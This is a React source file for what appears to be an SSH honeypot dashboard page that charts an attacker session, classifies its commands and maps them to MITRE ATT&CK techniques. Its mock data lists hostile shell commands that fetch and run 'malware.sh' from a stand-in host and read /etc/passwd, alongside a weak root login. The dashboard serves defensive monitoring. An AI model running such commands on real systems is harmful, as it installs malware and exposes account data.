
import { useNavigate } from "react-router-dom";
import Navbar from "@/components/Navbar";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { PieChart, Pie, Cell, BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer } from 'recharts';

// Mock data for command classification
const commandClassification = [
  { name: 'File Download', value: 42 },
  { name: 'Reconnaissance', value: 85 },
  { name: 'Persistence', value: 23 },
  { name: 'Privilege Escalation', value: 15 },
  { name: 'Lateral Movement', value: 7 },
];

// Mock data for command frequency
const commandFrequency = [
  { name: 'ls', count: 45 },
  { name: 'cat', count: 32 },
  { name: 'wget', count: 27 },
  { name: 'chmod', count: 18 },
  { name: 'cd', count: 15 },
  { name: 'curl', count: 12 },
  { name: 'uname', count: 10 },
];

// Mock commands with classifications
const commands = [
  { id: 1, command: 'wget http://malicious.com/malware.sh', timestamp: '2025-04-22T10:05:33Z', classification: 'File Download' },
  { id: 2, command: 'chmod +x malware.sh', timestamp: '2025-04-22T10:05:40Z', classification: 'File Modification' },
  { id: 3, command: './malware.sh', timestamp: '2025-04-22T10:05:45Z', classification: 'Execution' },
  { id: 4, command: 'ls -la', timestamp: '2025-04-22T10:05:50Z', classification: 'Reconnaissance' },
  { id: 5, command: 'cat /etc/passwd', timestamp: '2025-04-22T10:06:05Z', classification: 'Information Gathering' },
];

// MITRE ATT&CK techniques
const mitreTechniques = [
  { id: 'T1059', name: 'Command and Scripting Interpreter', tactic: 'Execution', confidence: 'High' },
  { id: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control', confidence: 'High' },
  { id: 'T1083', name: 'File and Directory Discovery', tactic: 'Discovery', confidence: 'Medium' },
  { id: 'T1018', name: 'Remote System Discovery', tactic: 'Discovery', confidence: 'Medium' },
];

const COLORS = ['#8B5CF6', '#6366F1', '#EC4899', '#F43F5E', '#10B981'];

const SessionAnalysis = () => {
  const navigate = useNavigate();
  
  return (
    <div className="min-h-screen bg-cyber">
      <Navbar />
      <div className="container mx-auto py-6 px-4">
        <h1 className="text-3xl font-bold text-cyber-accent mb-6">Session Analysis</h1>
        
        <Card className="bg-cyber-muted border-cyber-border mb-6">
          <CardHeader>
            <CardTitle>Session 12345</CardTitle>
            <CardDescription>IP: 192.168.1.105 | Duration: 12m 45s | Location: China | Started: 2025-04-22 10:05:33</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-3 gap-4 text-sm">
              <div>
                <span className="text-cyber-foreground/70">Username attempts:</span>
                <span className="ml-2 text-cyber-foreground">7</span>
              </div>
              <div>
                <span className="text-cyber-foreground/70">Password attempts:</span>
                <span className="ml-2 text-cyber-foreground">12</span>
              </div>
              <div>
                <span className="text-cyber-foreground/70">Commands executed:</span>
                <span className="ml-2 text-cyber-foreground">24</span>
              </div>
              <div>
                <span className="text-cyber-foreground/70">Client version:</span>
                <span className="ml-2 text-cyber-foreground">SSH-2.0-OpenSSH_7.9</span>
              </div>
              <div>
                <span className="text-cyber-foreground/70">Success login:</span>
                <span className="ml-2 text-cyber-foreground">Yes (root:123456)</span>
              </div>
              <div>
                <span className="text-cyber-foreground/70">Session status:</span>
                <span className="ml-2 text-cyber-foreground">Closed</span>
              </div>
            </div>
          </CardContent>
        </Card>
        
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
          <Card className="bg-cyber-muted border-cyber-border">
            <CardHeader>
              <CardTitle>Command Classification</CardTitle>
              <CardDescription>ML classification of commands executed</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="h-80">
                <ResponsiveContainer width="100%" height="100%">
                  <PieChart>
                    <Pie
                      data={commandClassification}
                      cx="50%"
                      cy="50%"
                      labelLine={false}
                      outerRadius={100}
                      fill="#8884d8"
                      dataKey="value"
                      label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
                    >
                      {commandClassification.map((entry, index) => (
                        <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
                      ))}
                    </Pie>
                    <Tooltip />
                    <Legend />
                  </PieChart>
                </ResponsiveContainer>
              </div>
            </CardContent>
          </Card>
          
          <Card className="bg-cyber-muted border-cyber-border">
            <CardHeader>
              <CardTitle>Command Frequency</CardTitle>
              <CardDescription>Most frequently used commands</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="h-80">
                <ResponsiveContainer width="100%" height="100%">
                  <BarChart
                    data={commandFrequency}
                    layout="vertical"
                    margin={{ top: 20, right: 30, left: 60, bottom: 5 }}
                  >
                    <CartesianGrid strokeDasharray="3 3" />
                    <XAxis type="number" />
                    <YAxis dataKey="name" type="category" />
                    <Tooltip />
                    <Legend />
                    <Bar dataKey="count" name="Frequency" fill="#8B5CF6" />
                  </BarChart>
                </ResponsiveContainer>
              </div>
            </CardContent>
          </Card>
        </div>
        
        <Card className="bg-cyber-muted border-cyber-border mb-6">
          <CardHeader>
            <CardTitle>Command History</CardTitle>
            <CardDescription>All commands executed with ML classification</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="rounded-md border">
              <div className="grid grid-cols-4 gap-4 p-4 font-semibold border-b">
                <div>Command</div>
                <div>Timestamp</div>
                <div>Classification</div>
                <div>Output Length</div>
              </div>
              <div className="divide-y">
                {commands.map((cmd) => (
                  <div key={cmd.id} className="grid grid-cols-4 gap-4 p-4">
                    <div className="font-mono text-xs text-cyber-accent">{cmd.command}</div>
                    <div>{new Date(cmd.timestamp).toLocaleString()}</div>
                    <div>{cmd.classification}</div>
                    <div>{Math.floor(Math.random() * 1000) + 100} bytes</div>
                  </div>
                ))}
              </div>
            </div>
          </CardContent>
        </Card>
        
        <Card className="bg-cyber-muted border-cyber-border">
          <CardHeader>
            <CardTitle>MITRE ATT&CK Analysis</CardTitle>
            <CardDescription>Intent analysis based on MITRE ATT&CK framework</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="rounded-md border">
              <div className="grid grid-cols-4 gap-4 p-4 font-semibold border-b">
                <div>Technique ID</div>
                <div>Name</div>
                <div>Tactic</div>
                <div>Confidence</div>
              </div>
              <div className="divide-y">
                {mitreTechniques.map((technique) => (
                  <div key={technique.id} className="grid grid-cols-4 gap-4 p-4">
                    <div className="text-cyber-accent">{technique.id}</div>
                    <div>{technique.name}</div>
                    <div>{technique.tactic}</div>
                    <div>
                      <span className={`px-2 py-1 rounded-full text-xs ${
                        technique.confidence === 'High' 
                          ? 'bg-green-500/20 text-green-500' 
                          : technique.confidence === 'Medium'
                            ? 'bg-yellow-500/20 text-yellow-500'
                            : 'bg-red-500/20 text-red-500'
                      }`}>
                        {technique.confidence}
                      </span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default SessionAnalysis;
